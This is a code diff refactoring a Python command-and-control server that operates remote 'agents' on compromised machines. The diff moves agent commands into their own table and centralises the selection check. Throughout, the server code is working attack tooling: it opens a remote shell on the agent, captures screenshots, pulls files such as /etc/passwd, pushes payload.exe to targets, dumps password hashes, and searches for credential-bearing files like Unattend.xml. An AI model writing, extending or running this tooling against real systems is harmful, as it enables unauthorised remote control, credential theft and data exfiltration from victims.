@@ -36,22 +36,21 @@ class Server:
                 'function': self.selectAgent,
                 'description': 'Select an agent by ID | ID: Integer | Ex: agent 3'
             },
-            'shell': {
-                'function': self.shell,
-                'description': 'Open a reverse shell from the selected agent (type exit to quit the shell)'
-            },
-            'screenshot': {
-                'function': self.screenshot,
-                'description': 'Take a screenshot from the selected agent, you can optionally specify a name for the screenshot | Optional: FILE: String | screenshot [my_screenshot]'
-            },
-            'download': {
-                'function': self.download,
-                'description': 'Download the specified files | FILE: String | Ex: download /etc/passwd /etc/hosts'
-            },
             'bg': {
                 'function': self.background,
                 'description': 'Deselect the current agent'
             },
+            'kill': {
+                'function': self.killAgent,
+                'description': 'Kill an agent by id | ID: Integer | kill 4'
+            },
+            'help': {
+                'function': self.help,
+                'description': 'Show this help message'
+            }
+        }
+
+        self.agent_commands = {
             'upload': {
                 'function': self.upload,
                 'description': 'Upload a file to selected target | LOCAL_FILE: String   REMOTE_DEST: String | upload payload.exe /tmp/payload.exe'
@@ -68,13 +67,17 @@ class Server:
                 'function': self.ipconfig,
                 'description': 'Retrieve the IP Configuration from the current target '
             },
-            'kill': {
-                'function': self.killAgent,
-                'description': 'Kill an agent by id | ID: Integer | kill 4'
+                        'shell': {
+                'function': self.shell,
+                'description': 'Open a reverse shell from the selected agent (type exit to quit the shell)'
             },
-            'help': {
-                'function': self.help,
-                'description': 'Show this help message'
+            'screenshot': {
+                'function': self.screenshot,
+                'description': 'Take a screenshot from the selected agent, you can optionally specify a name for the screenshot | Optional: FILE: String | screenshot [my_screenshot]'
+            },
+            'download': {
+                'function': self.download,
+                'description': 'Download the specified files | FILE: String | Ex: download /etc/passwd /etc/hosts'
             }
         }
 
@@ -89,6 +92,8 @@ class Server:
         """Print help for commands"""
         print("\nAvailable Commands:")
         print("=" * 20)
+        for cmd, info in self.agent_commands.items():
+            print(f"{cmd:<12}: {info['description']}")
         for cmd, info in self.commands.items():
             print(f"{cmd:<12}: {info['description']}")
         print("=" * 20)
@@ -146,6 +151,9 @@ class Server:
                 command_name = command_name.lower()
                 if command_name in self.commands:
                     self.commands[command_name]['function'](' '.join(args))
+                elif command_name in self.agent_commands:
+                    if self.isAgentSelected():
+                        self.agent_commands[command_name]['function'](' '.join(args))
                 else:
                     print(f"Unknown command: {command_name}")
 
@@ -184,73 +192,69 @@ class Server:
 
 
     def shell(self, args):
-        if self.isAgentSelected():
-            self.current_agent.sock.sendall("shell".encode())
-            while True:
-                command = input('$> ').strip()
-                if command == '':
-                    continue
-                if command.lower() == 'exit':
-                    self.current_agent.sock.sendall("exit".encode())
-                    break
-                self.current_agent.sock.sendall(command.encode())
-                print(self.current_agent.sock.recv(8192).decode('latin1'))
+        self.current_agent.sock.sendall("shell".encode())
+        while True:
+            command = input('$> ').strip()
+            if command == '':
+                continue
+            if command.lower() == 'exit':
+                self.current_agent.sock.sendall("exit".encode())
+                break
+            self.current_agent.sock.sendall(command.encode())
+            print(self.current_agent.sock.recv(8192).decode('latin1'))
 
     def screenshot(self, args):
-        if self.isAgentSelected():
-            self.current_agent.sock.sendall("screenshot".encode())
-            args = list(filter(lambda x: x != "", args.split(" ")))
-            if len(args) >= 1:
-                screen_path = f"{args[0]}.jpg"
-            else:
-                screen_path = f"{secrets.token_hex(5)}.jpg"
-            with open(screen_path, 'wb') as f:
-                while True:
-                    data = self.current_agent.sock.recv(1024)
-                    if (data == SIG_EOF) or (not data):
-                        break
-                    f.write(data)
-            print(f'Screenshot saved at {screen_path}')
+        self.current_agent.sock.sendall("screenshot".encode())
+        args = list(filter(lambda x: x != "", args.split(" ")))
+        if len(args) >= 1:
+            screen_path = f"{args[0]}.jpg"
+        else:
+            screen_path = f"{secrets.token_hex(5)}.jpg"
+        with open(screen_path, 'wb') as f:
+            while True:
+                data = self.current_agent.sock.recv(1024)
+                if (data == SIG_EOF) or (not data):
+                    break
+                f.write(data)
+        print(f'Screenshot saved at {screen_path}')
     
     def download(self, args):
-        if self.isAgentSelected():
-            self.current_agent.sock.sendall(f"download {args}".encode())
-            args = list(filter(lambda x: x != "", args.split(" ")))
-            if len(args) < 1:
-                print("Please select at least one remote file to download\n\tEx: download /etc/passwd")
-                return
-            for file_path in args:
-                file = os.path.basename(file_path)
-                with open(file, 'w+b') as f:
-                    while True:
-                        data = self.current_agent.sock.recv(1024)
-                        decoded_data = data.decode("latin1")
-                        if (data == SIG_EOF) or (not data):
-                            break
-                        if (decoded_data.startswith("ERROR:")):
-                            print(decoded_data)
-                            os.remove(file)
-                            return
-                        f.write(data)
-                slash = ""
-                if self.platform == 'Linux':
-                    slash = '/'
-                else:
-                    slash = '\\'
-                print(f'File saved at {os.getcwd()}{slash}{file}')
+        self.current_agent.sock.sendall(f"download {args}".encode())
+        args = list(filter(lambda x: x != "", args.split(" ")))
+        if len(args) < 1:
+            print("Please select at least one remote file to download\n\tEx: download /etc/passwd")
+            return
+        for file_path in args:
+            file = os.path.basename(file_path)
+            with open(file, 'w+b') as f:
+                while True:
+                    data = self.current_agent.sock.recv(1024)
+                    decoded_data = data.decode("latin1")
+                    if (data == SIG_EOF) or (not data):
+                        break
+                    if (decoded_data.startswith("ERROR:")):
+                        print(decoded_data)
+                        os.remove(file)
+                        return
+                    f.write(data)
+            slash = ""
+            if self.platform == 'Linux':
+                slash = '/'
+            else:
+                slash = '\\'
+            print(f'File saved at {os.getcwd()}{slash}{file}')
     
     def upload(self, args):
-        if self.isAgentSelected():
-            args = list(filter(lambda x: x != "", args.split(" ")))
-            if len(args) < 2:
-                print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
-                return
-            self.current_agent.sock.sendall(f"upload {args[1]}".encode())
-            with open(args[0], 'rb') as f:
-                while (chunk := f.read(1024)):
-                    self.current_agent.sock.sendall(chunk)
-            self.current_agent.sock.sendall(SIG_EOF)
-            print("File sent to agent")
+        args = list(filter(lambda x: x != "", args.split(" ")))
+        if len(args) < 2:
+            print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
+            return
+        self.current_agent.sock.sendall(f"upload {args[1]}".encode())
+        with open(args[0], 'rb') as f:
+            while (chunk := f.read(1024)):
+                self.current_agent.sock.sendall(chunk)
+        self.current_agent.sock.sendall(SIG_EOF)
+        print("File sent to agent")
     
     def isAgentSelected(self):
         if self.current_agent.id != 0:
@@ -288,28 +292,27 @@ class Server:
             self.current_agent = Agent(['',''],'',0) # Reset with a dummy agent
 
     def hashdump(self, args):
-        if self.isAgentSelected():
-            args = list(filter(lambda x: x != "", args.split(" ")))
-            if len(args) < 1:
-                print("Please select a path to store the results\n\tEx: hashdump password.hashes")
-                return
-            file = args[0]
-            self.current_agent.sock.sendall("hashdump".encode())
-            remfile = False
-            with open(file, 'w+b') as f:
-                while True:
-                    data = self.current_agent.sock.recv(1024)
-                    decoded_data = data.decode("latin1")
-                    if (data == SIG_EOF) or (not data):
-                        break
-                    elif (data == ERROR_INSUFFICIENT_PERMS):
-                        print(f"ERROR: Insufficient permissions to dump hashes.")
-                        remfile = True
-                        f.close()
-                        os.remove(file)
-                        return
-                    f.write(data)
-            print(f'Hashes saved at {file}')
+        args = list(filter(lambda x: x != "", args.split(" ")))
+        if len(args) < 1:
+            print("Please select a path to store the results\n\tEx: hashdump password.hashes")
+            return
+        file = args[0]
+        self.current_agent.sock.sendall("hashdump".encode())
+        remfile = False
+        with open(file, 'w+b') as f:
+            while True:
+                data = self.current_agent.sock.recv(1024)
+                decoded_data = data.decode("latin1")
+                if (data == SIG_EOF) or (not data):
+                    break
+                elif (data == ERROR_INSUFFICIENT_PERMS):
+                    print(f"ERROR: Insufficient permissions to dump hashes.")
+                    remfile = True
+                    f.close()
+                    os.remove(file)
+                    return
+                f.write(data)
+        print(f'Hashes saved at {file}')
 
     def getAgent(self, id):
         for agent in self.agents:
@@ -317,22 +320,20 @@ class Server:
                 return agent
     
     def ipconfig(self, args):
-        if self.isAgentSelected():
-            self.current_agent.sock.sendall("ipconfig".encode())
-            data = self.current_agent.sock.recv(16384)
-            print(data.decode('utf-8'))
+        self.current_agent.sock.sendall("ipconfig".encode())
+        data = self.current_agent.sock.recv(16384)
+        print(data.decode('utf-8'))
     
     def search(self,args):
-        if self.isAgentSelected():
-            args = list(filter(lambda x: x != "", args.split(" ")))
-            if len(args) < 2:
-                print("Please specify a starting path and a file name\n\tEx: search C:\\ Unattend.xml")
-                return
-            self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
-            while True:
-                data = self.current_agent.sock.recv(1024)
-                decoded_data = data.decode("latin1")
-                if (data == SIG_EOF) or (not data):
-                    break
-                print('---')
-                print(decoded_data)
+        args = list(filter(lambda x: x != "", args.split(" ")))
+        if len(args) < 2:
+            print("Please specify a starting path and a file name\n\tEx: search C:\\ Unattend.xml")
+            return
+        self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
+        while True:
+            data = self.current_agent.sock.recv(1024)
+            decoded_data = data.decode("latin1")
+            if (data == SIG_EOF) or (not data):
+                break
+            print('---')
+            print(decoded_data)
